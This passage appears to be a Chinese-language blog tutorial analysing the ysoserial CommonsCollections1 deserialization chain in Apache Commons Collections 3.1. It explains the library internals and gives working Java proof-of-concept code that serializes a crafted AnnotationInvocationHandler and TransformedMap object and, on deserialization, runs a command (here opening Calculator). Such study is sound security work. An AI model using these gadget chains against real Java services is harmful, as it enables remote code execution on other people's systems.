&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line">        InvocationHandler handler = <span class="keyword">null</span>;</span><br><span class="line">        InvocationHandler payload = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            handler = (InvocationHandler)constructor.newInstance(Override.class,lazyMap);</span><br><span class="line">            Map proxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;, handler);</span><br><span class="line">            <span class="comment">// ----- 分割线 ----- 前半部分代码不再重复解释</span></span><br><span class="line">            payload = (InvocationHandler)constructor.newInstance(Override.class,proxy);<span class="comment">// 依旧使用反射创建 AnnotationInvocationHandler 对象，传入 proxy</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">            throwable.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream exp = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            oos = <span class="keyword">new</span> ObjectOutputStream(exp);</span><br><span class="line">            oos.writeObject(payload);<span class="comment">// 将 payload 对象序列化</span></span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream out = <span class="keyword">new</span> ByteArrayInputStream(exp.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ois = <span class="keyword">new</span> ObjectInputStream(out);</span><br><span class="line">            Object obj = ois.readObject();<span class="comment">// 命令执行！</span></span><br><span class="line">            ois.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>看完 ysoserial 的 CommonsCollections1 使用的利用链之后，我们再来看下 <code>wh1t3p1g</code> 师傅在 <a href="https://blog.0kami.cn/2019/10/24/java/study-java-deserialized-commonscollections3-1/">Java反序列化利用链挖掘之CommonsCollections1</a> 中提到的 AnnotationInvocationHandler.readObject() -&gt; TransformedMap.checkSetValue() 利用链</p><p><strong>org.apache.commons.collections.map.TransformedMap</strong> 代码片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Factory method to create a transforming map.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * If there are any elements already in the map being decorated, they</span></span><br><span class="line"><span class="comment"> * are NOT transformed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;<span class="comment">// valueTransformer 是我们可控的参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * If there are any elements already in the collection being decorated, they</span></span><br><span class="line"><span class="comment"> * are NOT transformed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(map);</span><br><span class="line">    <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Override to transform the value when using &lt;code&gt;setValue&lt;/code&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value  the value to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the transformed value</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;<span class="comment">// 调用了我们需要的 transform 方法</span></span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据 <strong>TransformedMap</strong> 代码可知，我们只需调用 TransformedMap.checkSetValue 即可触发 transform 方法，测试代码如下 Test4.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(innerMap,<span class="keyword">null</span>,transformerChain);<span class="comment">// 创建一个 transformedMap 对象</span></span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">// 由于 checkSetValue 是 protected 的，需要利用反射的方式来调用</span></span><br><span class="line">            Class clazz = TransformedMap.class;</span><br><span class="line">            Method method = clazz.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>,Object.class);</span><br><span class="line">            method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            method.invoke(transformedMap,<span class="string">&quot;1&quot;</span>);<span class="comment">// 调用方法，成功弹出计算器</span></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这下我们的目标就变成了寻找能够调用 TransformedMap.checkSetValue 的方法。</p><p><strong>sun.reflect.annotation.AnnotationInvocationHandler</strong> 代码片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;<span class="comment">// 依旧是 AnnotationInvocationHandler 类，我们可以控制 memberValues 的值</span></span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">    <span class="keyword">this</span>.type = var1;</span><br><span class="line">    <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var3 = var2.memberTypes();</span><br><span class="line">    Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;<span class="comment">// memberValues 要有数据</span></span><br><span class="line">        Entry var5 = (Entry)var4.next();</span><br><span class="line">        String var6 = (String)var5.getKey();<span class="comment">// 获取 memberValues 的 key 值</span></span><br><span class="line">        Class var7 = (Class)var3.get(var6);<span class="comment">// 根据 memberValues 的 key 查找在 type 注解类中的属性</span></span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;<span class="comment">// 找到对应的属性</span></span><br><span class="line">            Object var8 = var5.getValue();<span class="comment">// 获取 memberValues 的 value 值</span></span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;<span class="comment">// 如果 var8 不能够强制转换为 var7 的类型并且 var8 不是 ExceptionProxy 类型</span></span><br><span class="line">                var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));<span class="comment">// 只要进入这个逻辑，我们就成功调用了 Entry.setValue 方法</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么 Entry.setValue 能够调用 TransformedMap.checkSetValue 呢？我们来看 TransformedMap 的父类。</p><p><strong>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator</strong> 代码片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Implementation of a map entry that checks additions via setValue.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapEntry</span> <span class="keyword">extends</span> <span class="title">AbstractMapEntryDecorator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The parent map */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(entry);</span><br><span class="line">        <span class="keyword">this</span>.parent = parent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;<span class="comment">// 调用 setValue 方法时会优先执行 parent.checkSetValue 方法</span></span><br><span class="line">        value = parent.checkSetValue(value);</span><br><span class="line">        <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反射链已经满足条件了，POC 代码如下 Test5.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resources;</span><br><span class="line"><span class="keyword">import</span> javax.xml.ws.Action;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;input&quot;</span>,<span class="number">1</span>);<span class="comment">// 为了达成 AnnotationInvocationHandler.readObject 的逻辑，这里需要放入创建 AnnotationInvocationHandler 对象时传入的注解类属性的键，和一个与传入注解类属性类型不符的对象（这里传入了一个 Integer）</span></span><br><span class="line">        Map transformedMap = TransformedMap.decorate(innerMap,<span class="keyword">null</span>,transformerChain);</span><br><span class="line">        Object instance = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            instance = constructor.newInstance(Action.class,transformedMap);<span class="comment">// 这里使用了 Action 注解类（也可以换成其他继承了 Annotation 的类），配合上面放入 innerMap 中的数据即可完成利用，弹出计算器</span></span><br><span class="line">            <span class="comment">// instance = constructor.newInstance(Resources.class,transformedMap);// 如果是 Resources 注解类，Map 中可以放入 (&quot;value&quot;,1) 来完成利用，建议自己动手试试其他注解类，更深刻的理解该利用链</span></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream exp = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            oos = <span class="keyword">new</span> ObjectOutputStream(exp);</span><br><span class="line">            oos.writeObject(instance);<span class="comment">// 将 instance 对象序列化</span></span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream out = <span class="keyword">new</span> ByteArrayInputStream(exp.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ois = <span class="keyword">new</span> ObjectInputStream(out);</span><br><span class="line">            Object obj = ois.readObject();<span class="comment">// 命令执行！</span></span><br><span class="line">            ois.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h3><p>ysoserial 的 CommonsCollections1 主要利用反射、动态代理的特性，寻找可利用的方法，最终命令执行。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.0kami.cn/2019/10/24/java/study-java-deserialized-commonscollections3-1/">Java反序列化利用链挖掘之CommonsCollections1</a> 主要学习文章</li><li><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984">动态代理 - 廖雪峰的官方网站</a></li><li><a href="https://blog.csdn.net/yaomingyang/article/details/80981004">Java动态代理InvocationHandler和Proxy学习笔记</a></li><li><a href="https://blog.csdn.net/qq_39056197/article/details/102598674">jdk动态代理invoke方法自动运行原因</a></li><li><a href="https://zhuanlan.zhihu.com/p/45299858">JDK动态代理-超详细源码分析（二）</a></li><li><a href="https://www.v2ex.com/t/596995">Java 动态代理 Proxy.newProxyInstance 第一个参数到底该用哪个类的类加载器啊？</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文仍以 Apache Commons Collections 反序列化为例，分析 ysoserial 中的 CommonsCollections1 利用链。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞分析&quot;&gt;&lt;/a&gt;漏洞分析&lt;/h2&gt;&lt;h3 id=&quot;1、漏洞复现环境&quot;&gt;&lt;a href=&quot;#1、漏洞复现环境&quot; class=&quot;headerlink&quot; title=&quot;1、漏洞复现环境&quot;&gt;&lt;/a&gt;1、漏洞复现环境&lt;/h3&gt;&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&amp;lt;!-- jdk 7 / Apache Commons Collections 组件版本如下 --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&amp;lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;commons-collections&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;commons-collections&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;3.1&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span 